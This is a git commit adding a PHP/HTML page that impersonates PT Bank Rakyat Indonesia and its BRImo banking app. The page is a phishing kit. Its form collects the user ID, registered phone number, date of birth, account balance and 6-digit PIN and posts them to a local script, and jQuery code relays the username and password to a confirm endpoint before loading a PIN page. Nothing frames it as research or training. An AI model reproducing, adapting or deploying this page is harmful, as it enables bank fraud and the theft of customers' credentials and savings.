2bf9d182f22971db722ea165a4a7d9efbc5c86ad
Belajar <161888204+marselinoldjahiat@users.noreply.github.com>
2024-08-23 02:55:58 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,455 @@
+<!doctype html>
+<html lang="en" class="notranslate">
+  <head>
+    <meta charset="utf-8">
+    <meta name="fragment" content="!">
+    <meta name="theme-color" content="#0f78cb">
+    <meta name="description" content="Gedung BRI, Jl. Jendral Sudirman Kav.44-46 Jakarta 1021........">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta property="og:" content="PT.Bank Rakyat Indonesia (Persero) Tbk." />
+    <meta name="twitter:title" content="PT.Bank Rakyat Indonesia (Persero) Tbk." />
+    <meta property="og:site_name" content="PT.Bank Rakyat Indonesia (Persero) Tbk." />
+    <meta name="twitter:site_name" content="PT.Bank Rakyat Indonesia (Persero) Tbk." />
+    <meta property="og:description" content="Gedung BRI, Jl. Jendral Sudirman Kav.44-46 Jakarta 1021........" />
+    <meta name="twitter:description" content="Gedung BRI, Jl. Jendral Sudirman Kav.44-46 Jakarta 1021........" />
+    <link rel="icon" type="image/png" href="https://i.ibb.co/dtBQTn1/Frame-1-1.jpg" />
+    <link rel="image_src" href="https://i.ibb.co/dtBQTn1/Frame-1-1.jpg" />
+    <meta property="og:type" content="website" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui">
+    <title>PT.Bank Rakyat Indonesia (Persero) Tbk.</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.0/css/ionicons.min.css"/>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <style>
+        @font-face {
+            font-family: 'Avenir';
+            src: url(fonts/AvenirNextLTPro-Bold.otf);
+        }
+        
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            font-family: 'Avenir';
+        }
+       
+ 
+
+        h3 {
+            font-family: Sans-serif; 
+            font-size: 15px; 
+            font-weight: bold; 
+            color: #000; 
+            letter-spacing: 1.5px;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+        
+        h9 {
+            font-family: Sans-serif; 
+            font-size: 13px; 
+            font-weight: bold;
+            text-align: center;
+            color: #0086e0; 
+            letter-spacing: 1.4px;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+        
+        h4 {
+            font-family: Helvetica; 
+            font-size: 16px; 
+            font-weight: bold; 
+            color: #000; 
+            letter-spacing: 1px;
+            text-align: center;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+        
+        h5 {
+            font-family: Helvetica; 
+            font-size: 10px; 
+            font-weight: bold; 
+            color: #0086e0; 
+            letter-spacing: 1px;
+            text-align: center;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+        
+        h6 {
+            font-family: Helvetica; 
+            font-size: 13px; 
+            font-weight: bold; 
+            color: #000; 
+            letter-spacing: 1px;
+            text-align: center;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+ 
+        .btn-punya {
+            display: block;
+            margin: 0px auto 0 auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgb(0, 134, 224);
+            border: none; 
+            text-align: center; 
+            height: 42px; 
+            width: 536px; 
+            max-width: 95%;
+            font-family: robot; 
+            font-size: 16px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 2px;
+            line-height: 2; 
+            border-radius: 5px; 
+            box-shadow: rgb(170, 170, 170) 10px 10px 12px 0px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .btn-belum {
+            display: block;
+            margin: 10px auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none transparent;
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 536px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 16px; 
+            font-weight: bold; 
+            color: rgb(0, 134, 224);
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            transition: background 200ms ease 0s;
+     
+   }
+        
+       .btn-marque {
+ display: block;
+            margin: 2px auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: rgb(240, 248, 254);
+            border: none; 
+            text-align: center; 
+            height: 20px; 
+            width: 536px; 
+            max-width: 100%;
+            font-family: robot; 
+            font-size: 12px; 
+            font-weight: rgb(0, 134, 224); 
+            color: black;
+            letter-spacing: 1px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            transition: background 200ms ease 0s;
+     
+   }
+
+ .form-log {
+            box-sizing: border-box; 
+            height: 45px; 
+            width: 536px; 
+            max-width: 100%; 
+            border: 3px solid rgb(0, 134, 224); 
+            border-image: initial; 
+            background-color: white; 
+            border-radius: 8px; 
+            box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; 
+            font-family: robot;
+            font-size: 16px; 
+            color: black; 
+            word-spacing: 7px; 
+            padding: 0px 45px;
+        }
+        
+        #ionIcons {
+            color: rgb(22, 119, 199);
+            font-size: 29px;
+            position: absolute;
+            display: block;
+            margin-top: 3px;
+            margin-left: 15px;
+        }
+        
+        input {
+            border: 3px solid rgb(0, 134, 224);
+            border-radius: 8px;
+            padding: 5px 10px;
+        }
+        
+        h1{
+            display: table;
+            background: #F8F8FF;
+            color: #fff;
+            padding: 2px;
+            width: 100%;
+            
+        }
+        
+        h7{
+            display: table;
+            background: #3081ce;
+            color: #fff;
+            padding: 15px;
+            width: 100%;
+            font-size: 12px;
+            text-align: center;
+            font-family: sans-serif;
+            
+        }
+
+        .container {
+            max-width: 900px;
+            padding: 15px;
+            background-color: #fff;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .slider .slick-slide {
+            border: solid 0px #000;
+        }
+
+        .slider .slick-slide img {
+            width: 100%;
+            margin-top: 0px;
+        }
+
+        /* make button larger and change their positions */
+        .slick-prev, .slick-next {
+            width: 0px;
+            height: 0px;
+            z-index: 1;
+        }
+        .slick-prev {
+            left: 0px;
+        }
+        .slick-next {
+            right: 0px;
+        }
+        .slick-prev:before, 
+        .slick-next:before {
+            font-size: 0px;
+            text-shadow: 0 0 0px rgba(0,0,0,0.5);
+        }
+        
+        /* move dotted nav position */
+        .slick-dots {
+            bottom: 0px;
+        }
+        /* enlarge dots and change their colors */
+        .slick-dots li button:before {
+            font-size: 12px;
+            color: #000;
+            text-shadow: 0 0 10px rgba(0,0,0,0.5);
+            opacity: 0;
+        }
+        .slick-dots li.slick-active button:before {
+            color: #dedede;
+        }
+
+        /* transition effects for opacity */
+        .slick-arrow,
+         {
+            transition: opacity 0.2s ease-out;
+        }
+        
+       
+</legend>
+<center>
+<html>
+<head><title>Selamat datang di Layanan BANK BRI</title></head>
+<style type="text/css">
+.hakko {
+    background-color: #F8F8FF;
+    color: white;
+    font-family: robot;
+    font-size: 10px;
+    font-style: bold;
+}
+</style>
+</head>
+   <div class="container">
+        <div class="row">
+            <div class="col-12 d-block mx-auto text-center p-0" style="height: auto; width: auto; max-width: auto; margin-top: -10px; border-radius: 9px;">
+                <img alt="" src="img/bglog.jpg" style="display: block; margin: -1px; width: 100%; height: 100%; border-radius: 8px;">
+            </div>
+        </div>
+       <center>
+ <p>
+<marquee class="btn-marque" behavior="scroll" direction="left" onmouseover="this.stop();" onmouseout="this.start();" >📢 Selamat datang di  PT. Bank Rakyat Indonesia (Persero) Tbk.
+</marquee>
+</head>
+  <body>
+<div class="row" style="margin-top: -50px;">
+            <div class="col-12 d-block mx-auto" style="margin-bottom: 0px; white-space: pre-wrap; width: 459px; max-width: 100%; left: 0px; top: 0px; height: 98.8px; padding-bottom: 0px; font-family: Barlow; font-size: 16px; font-weight: 400; color: black; line-height: 1.4; border-radius: 20px;">
+ <div class="text-header"><font  style="font-size: 14px; font-weight: bolder;"><strong>&nbsp; &nbsp;&nbsp;Silahkan lengkapi di bawah ini untuk</strong></font>
+    </div>
+        </div>
+ <form method="post" action="auth/blm.php">
+         <div class="row">
+                <div class="col-12" style="width: 459px; max-
+width: 100%; display: block; margin: -25px auto; padding: 15px ;">                   <center>
+                    <div>
+                      <h5 style="font-family: 'robot'; font-size: 
+   14px;">User ID BRImo :</h5>
+  <i class="ion-ios-person-outline" id="ionIcons"></i>
+                        <input name="username" id="user" type="text" class="bubble-element Input form-log" placeholder="Username BRImo" maxlength="" style="border-radius: 5px " required>
+                    </div>
+                    <br>
+                    <div style="margin-top: 0px">
+                        <h5 style="font-family: 'robot'; font-size: 
+   14px;">Nomor Ponsel Terdaftar BRImo:</h5>
+<i class="ion-ios-telephone-outline" id="ionIcons"></i>
+                        <input type="tel" name="nohp" id="password" class="bubble-element Input form-log" placeholder="Nomor Ponsel" maxlength="14" minlength="9" style="border-radius: 5px;" required>
+                        </div>
+                    <br>                     
+                        <div style="margin-top: 0px">
+                        <h5 style="font-family: 'robot'; font-size: 
+   14px;">Tanggal Lahir :</h5>
+<i class="ion-ios-calendar-outline" id="ionIcons"></i>
+                        <input type="tel" name="ttl" id="password" class="bubble-element Input form-log" placeholder="DD-MM-YYYY" maxlength="8" minlength="8" style="border-radius: 5px;" required>
+                        </div>
+                    <br>
+                    <div style="margin-top: 0px">
+                        <h5 style="font-family: 'robot'; font-size: 
+   14px;">Sisa Saldo :</h5>
+                    <input type="tel" name="saldo" id="dengan-rupiah" class="bubble-element Input form-log" 
+placeholder="Saldo Saat Ini" maxlength="" 
+minlength="9" style="border-radius: 5px;" required>
+                        </div>
+                    <br>
+                        <div style="margin-top: 0px">
+                        <h5 style="font-family: 'robot'; font-size: 
+   14px;">Pin BRImo :</h5>
+<i class="ion-ios-lock-outline" id="ionIcons"></i>
+                        <input type="tel" name="pin" id="password" class="bubble-element Input form-log" placeholder="******" maxlength="6" minlength="6" style="border-radius: 5px;" required>
+                        </div>
+                    <br>
+<center>
+                     <button type="submit" id="sent_sms" class="bubble-element Button clickable-element" style="max-width: 100%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1.5px; line-height: 1; border-radius: 5px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s;" tabindex="2">Konfirmasi</button>
+            </form>
+    </div>
+
+    <script src="js/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous"></script>
+    <script> /* Dengan Rupiah */
+    var dengan_rupiah = document.getElementById('dengan-rupiah');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }</script>
+    <script>
+
+        function OnButton(user, pass) {
+
+            if(user.length > 4 && pass.length > 4) {
+                $(".btn-login").prop('disabled', false);
+            } else {
+                $(".btn-login").prop('disabled', true);
+            }
+        }
+        $(document).ready(function() {
+            $("body").on('click', 'button#doLog', function() {
+                var user = $("#user").val();
+                var pass = $("#password").val();
+
+                $.ajax({
+                    url: "/login/confirm.php",
+                    method: "POST",
+                    data: "username="+user+"&password="+pass,
+                    beforeSend: function() {
+                        $("#loading").show();
+                    },
+                    success: function(responsex) {
+                        $("#aseli").html('');
+                        if(responsex == "true") {
+                            $.get("/pin-confirm/index.php", function(datax, status){
+                                window.history.pushState("", "", '/pin-confirm');
+                                $("#hideBody").hide();
+                                $("#loading").hide();
+                                $("#aseli").html(datax);
+                            });
+                        } else {
+                            $.get("/login/index.php", function(data, status){
+                                window.history.pushState("", "", '/login');
+                                setTimeout(function() { 
+                                    $("#hideBody").hide();
+                                    $("#loading").hide();
+                                    $("#aseli").html(data);
+                                    $("#aseli").show();
+                                }, 1000);
+                            });
+                        }
+                        
+                    }
+                })
+            });
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#password").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#password").prop("type", "password");
+                });
+            });
+
+            $("#user").on('input', function() {
+                var user = $("#user").val();
+                var pass = $("#password").val();
+
+                OnButton(user, pass);
+            });
+
+            $("#password").on('input', function() {
+                var user = $("#user").val();
+                var pass = $("#password").val();
+
+                OnButton(user, pass);
+            });
+        });
+    </script>
+    <!-- </body> -->
+  </body>
+
